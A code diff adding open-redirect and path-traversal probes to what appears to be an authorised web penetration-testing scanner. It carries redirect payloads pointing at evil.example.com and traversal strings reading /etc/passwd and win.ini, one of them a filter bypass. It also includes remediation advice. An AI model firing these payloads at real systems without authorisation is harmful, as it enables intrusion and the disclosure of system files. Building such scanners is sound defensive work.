@@ -37,6 +37,9 @@ class InjectionProbes(ProbeBase):
                     "reason=stored_xss_writes_data_to_target"],
         ))
     self.run_safe("ssrf", self._test_ssrf)
+    self.run_safe("open_redirect", self._test_open_redirect)
+    if self.auth.official_session:
+      self.run_safe("path_traversal", self._test_path_traversal)
     return self.findings
 
   def _test_login_injection(self):
@@ -377,3 +380,210 @@ class InjectionProbes(ProbeBase):
           remediation="Investigate with out-of-band callback to confirm blind SSRF.",
         ))
         return
+
+  def _test_open_redirect(self):
+    """
+    PT-A01-04: test URL parameters for open redirect vulnerabilities.
+
+    Tests common redirect parameter names (next, url, redirect, return_to,
+    continue, dest, goto, forward) with an external domain payload.
+    Checks if the response issues a redirect to the attacker-controlled domain.
+
+    Read-only: only sends GET requests with modified query parameters.
+    """
+    session = self.auth.official_session or self.auth.anon_session
+    if not session:
+      return
+
+    redirect_params = [
+      "next", "url", "redirect", "redirect_url", "return_to", "return",
+      "continue", "dest", "destination", "goto", "forward", "redir",
+      "returnUrl", "redirect_uri", "callback",
+    ]
+    payload = "//evil.example.com"
+    payload_alt = "https://evil.example.com"
+
+    # Test against: login page (common redirect after login), discovered routes
+    test_paths = [self.target_config.login_path, self.target_config.logout_path]
+    for route in self.discovered_routes:
+      test_paths.append(route)
+    # Deduplicate
+    seen = set()
+    unique_paths = []
+    for p in test_paths:
+      if p and p not in seen:
+        seen.add(p)
+        unique_paths.append(p)
+
+    tested = 0
+    vulnerable_evidence = []
+
+    for path in unique_paths[:10]:  # cap to avoid excessive requests
+      for param in redirect_params:
+        self.safety.throttle()
+        url = self.target_url + path
+        try:
+          resp = session.get(
+            url, params={param: payload},
+            timeout=10, allow_redirects=False,
+          )
+        except Exception:
+          continue
+        tested += 1
+
+        # Check for redirect to evil domain
+        if resp.status_code in (301, 302, 303, 307, 308):
+          location = resp.headers.get("Location", "")
+          if "evil.example.com" in location:
+            vulnerable_evidence.append(
+              f"endpoint={path}; param={param}; location={location}"
+            )
+            break  # one redirect per path is enough
+
+        # Also test the alternate payload (full URL)
+        if not vulnerable_evidence or vulnerable_evidence[-1].split(";")[0] != f"endpoint={path}":
+          self.safety.throttle()
+          try:
+            resp2 = session.get(
+              url, params={param: payload_alt},
+              timeout=10, allow_redirects=False,
+            )
+          except Exception:
+            continue
+          tested += 1
+
+          if resp2.status_code in (301, 302, 303, 307, 308):
+            location2 = resp2.headers.get("Location", "")
+            if "evil.example.com" in location2:
+              vulnerable_evidence.append(
+                f"endpoint={path}; param={param}; location={location2}"
+              )
+              break
+
+      if len(vulnerable_evidence) >= 3:
+        break  # enough evidence
+
+    if vulnerable_evidence:
+      self.findings.append(GrayboxFinding(
+        scenario_id="PT-A01-04",
+        title="Open redirect via URL parameter",
+        status="vulnerable",
+        severity="MEDIUM",
+        owasp="A01:2021",
+        cwe=["CWE-601"],
+        attack=["T1566"],
+        evidence=vulnerable_evidence,
+        replay_steps=[
+          "Navigate to the vulnerable endpoint with redirect parameter.",
+          f"Set parameter to {payload} or {payload_alt}.",
+          "Observe 3xx redirect to attacker-controlled domain.",
+        ],
+        remediation="Validate redirect targets against a server-side allowlist. "
+                    "Use relative paths only, or verify the destination host "
+                    "matches your domain. Never pass user input directly to "
+                    "Location headers.",
+      ))
+    elif tested > 0:
+      self.findings.append(GrayboxFinding(
+        scenario_id="PT-A01-04",
+        title="Open redirect — no vulnerability detected",
+        status="not_vulnerable",
+        severity="INFO",
+        owasp="A01:2021",
+        evidence=[f"parameters_tested={tested}"],
+      ))
+
+  def _test_path_traversal(self):
+    """
+    PT-A03-03: test parameters for directory traversal vulnerabilities.
+
+    Tests query parameters and path segments in discovered routes with
+    path traversal payloads. Checks response body for OS file content
+    markers (e.g. root:x: from /etc/passwd).
+
+    Read-only: only sends GET requests with modified parameters.
+    """
+    session = self.auth.official_session
+    if not session:
+      return
+
+    traversal_payloads = [
+      ("../../../../../../etc/passwd", ["root:x:", "root:*:", "daemon:", "nobody:"]),
+      ("..\\..\\..\\..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]", "[mci extensions]"]),
+      ("....//....//....//....//etc/passwd", ["root:x:", "root:*:"]),  # filter bypass
+    ]
+    # Common parameter names that might accept file paths
+    file_params = [
+      "file", "path", "page", "doc", "document", "template", "include",
+      "name", "folder", "dir", "download", "filename", "filepath",
+      "view", "content", "layout", "resource",
+    ]
+
+    # Collect routes that have query-like structure or path parameters
+    test_routes = []
+    for route in self.discovered_routes:
+      test_routes.append(route)
+    # Always test the root as well
+    if "/" not in test_routes:
+      test_routes.append("/")
+
+    tested = 0
+    vulnerable_evidence = []
+
+    for route in test_routes[:10]:  # cap to avoid excessive requests
+      url = self.target_url + route
+
+      # Strategy 1: inject via query parameters
+      for param in file_params:
+        if tested > 60:
+          break  # hard cap on total requests
+        for payload, markers in traversal_payloads:
+          self.safety.throttle()
+          try:
+            resp = session.get(url, params={param: payload}, timeout=10)
+          except Exception:
+            continue
+          tested += 1
+
+          if resp.status_code == 200:
+            body = resp.text
+            if any(m in body for m in markers):
+              vulnerable_evidence.append(
+                f"endpoint={route}; param={param}; payload={payload}"
+              )
+              break  # one hit per route+param is enough
+        if vulnerable_evidence:
+          break  # found a hit on this route, move on
+
+      if len(vulnerable_evidence) >= 3:
+        break
+
+    if vulnerable_evidence:
+      self.findings.append(GrayboxFinding(
+        scenario_id="PT-A03-03",
+        title="Path traversal — file content disclosed",
+        status="vulnerable",
+        severity="HIGH",
+        owasp="A03:2021",
+        cwe=["CWE-22"],
+        attack=["T1083"],
+        evidence=vulnerable_evidence,
+        replay_steps=[
+          "Log in as authenticated user.",
+          f"Request GET with traversal payload in file parameter.",
+          "Observe OS file contents (e.g. /etc/passwd) in response body.",
+        ],
+        remediation="Validate and sanitize all file path inputs server-side. "
+                    "Use a whitelist of allowed files, canonicalize paths, "
+                    "and ensure they stay within the application's base directory. "
+                    "Never pass user input directly to file system operations.",
+      ))
+    elif tested > 0:
+      self.findings.append(GrayboxFinding(
+        scenario_id="PT-A03-03",
+        title="Path traversal — no vulnerability detected",
+        status="not_vulnerable",
+        severity="INFO",
+        owasp="A03:2021",
+        evidence=[f"requests_tested={tested}"],
+      ))
